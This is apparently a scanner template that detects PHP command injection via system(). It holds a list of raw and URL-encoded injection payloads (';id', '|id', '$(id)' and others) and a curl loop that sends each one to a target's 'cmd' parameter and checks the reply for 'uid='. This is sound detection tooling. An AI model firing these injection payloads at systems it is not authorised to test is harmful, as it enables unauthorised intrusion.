AUTHOR='@xer0dayz'
VULN_NAME='PHP Shell Injection - system() Function'
URI="/vulnerable.php?cmd=id"
METHOD='GET'
MATCH='uid='
SEVERITY='P1 - CRITICAL'
CURL_OPTS="--user-agent 'Mozilla/5.0' -s -L --insecure"
SECONDARY_COMMANDS='''
# Common PHP shell injection payloads
PAYLOADS=(
  ";id"
  "|id"
  "&&id"
  "||id"
  "`id`"
  "$(id)"
  "%3Bid"  # URL-encoded ;
  "%7Cid"  # URL-encoded |
  "%26%26id"  # URL-encoded &&
  "%7C%7Cid"  # URL-encoded ||
  "%60id%60"  # URL-encoded `id`
  "%24%28id%29"  # URL-encoded $(id)
)

# Test each payload
for payload in "${PAYLOADS[@]}"; do
  echo -n "Testing payload: $payload - "
  curl -s -k "$TARGET/vulnerable.php?cmd=$payload" | grep -q "uid=" && echo "[VULNERABLE]" || echo "[SAFE]"
done
'''

# This template detects PHP command injection via system() function
